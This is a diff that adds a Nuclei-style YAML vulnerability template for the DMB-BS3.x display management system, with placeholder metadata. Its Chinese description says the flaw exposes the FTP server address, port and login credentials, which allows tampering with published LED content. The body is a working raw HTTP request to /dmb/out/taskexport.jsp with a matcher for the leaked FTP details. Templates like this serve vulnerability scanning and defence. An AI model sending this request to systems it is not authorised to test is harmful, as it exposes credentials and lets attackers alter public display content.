@@ -1,0 +1,26 @@
+id: DMB-BS-taskexport-weak
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 影响系统 DMB-BS3.x，攻击者可以可以通过此漏洞读取 FTP 服务器地址、端口及账号密码，通过 FTP 可篡改 LED 发布信息，如:展播视频、图片、文字。攻击者可以利用反编译修改 jar 进一步攻击系统。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET //dmb/out/taskexport.jsp?taskcode= HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: keep-alive
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - <ftp host
